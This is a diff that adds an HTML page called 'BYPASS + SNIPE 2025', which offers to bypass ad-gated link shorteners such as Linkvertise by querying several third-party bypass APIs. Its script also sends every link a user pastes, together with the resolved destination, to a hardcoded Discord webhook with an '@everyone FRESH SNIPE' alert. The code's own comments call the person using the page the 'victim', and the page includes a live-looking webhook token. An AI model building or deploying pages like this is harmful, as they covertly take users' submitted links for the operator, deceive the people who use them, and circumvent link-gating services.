@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>2025 BYPASS + SNIPER</title>
+    <meta charset="utf-8">
+    <style>
+        body{font-family:Arial;background:#000;color:#0f0;text-align:center;padding:50px}
+        input,button{font-size:24px;padding:15px;margin:10px;width:90%;max-width:700px}
+        button{background:#0f0;color:#000;border:none;cursor:pointer;border-radius:10px}
+        h1{font-size:60px;text-shadow:0 0 30px #0f0}
+        .log{color:#0f0;font-size:18px;margin:20px}
+    </style>
+</head>
+<body>
+    <h1>BYPASS + SNIPE 2025</h1>
+    <p>Paste any loot link — real link gets sent to Discord instantly</p>
+    <input type="text" id="url" placeholder="https://linkvertise.com/12345/abc" />
+    <button onclick="snipe()">BYPASS & SNIPE</button>
+    <div class="log" id="status"></div>
+
+<script>
+// YOUR DISCORD WEBHOOK
+const WEBHOOK = "https://discord.com/api/webhooks/1467137149873819710/oDpNM0_05l4BLYpA6yri4jQ_mB14fvJF5wkOOsMozD4KNM17kBXFmb189GWvxr2-r_kb";
+
+// Updated bypass APIs August 2025
+const APIs = [
+    "https://bypass.city/api/bypass?url=",
+    "https://bypass.pm/api/v2?url=",
+    "https://api.shrtbypass.in/bypass?url=",
+    "https://gateway.platoboost.com/a/8?id=",
+    "https://api.bypass.vip/rekonise?url="
+];
+
+async function snipe() {
+    const input = document.getElementById("url").value.trim();
+    if (!input) return alert("No link dumbass");
+
+    document.getElementById("status").textContent = "Bypassing & sniping...";
+
+    let realUrl = input;
+
+    for (const api of APIs) {
+        try {
+            const resp = await fetch(api + encodeURIComponent(input), {signal: AbortSignal.timeout(5000)});
+            if (!resp.ok) continue;
+            const data = await resp.json();
+            const destination = data.destination || data.url || data.link || data.success;
+            if (destination && destination.includes("http")) {
+                realUrl = destination;
+                break;
+            }
+        } catch(e) {
+            continue;
+        }
+    }
+
+    // SEND REAL LINK TO YOUR DISCORD
+    fetch(WEBHOOK, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            content: "@everyone **FRESH SNIPE**",
+            embeds: [{
+                title: "Someone Just Got Bypassed & Sniped",
+                color: 16711680,
+                fields: [
+                    {name: "Fake Link", value: input.length > 1000 ? input.slice(0,1000)+"..." : input},
+                    {name: "REAL LINK →", value: realUrl}
+                ],
+                timestamp: new Date().toISOString()
+            }]
+        })
+    });
+
+    // Show victim the real link + redirect
+    document.getElementById("status").innerHTML = `SNIPED → <a href="${realUrl}" style="color:#0f0">${realUrl}</a>`;
+    setTimeout(() => location.href = realUrl, 1500);
+}
+</script>
+</body>
+</html>
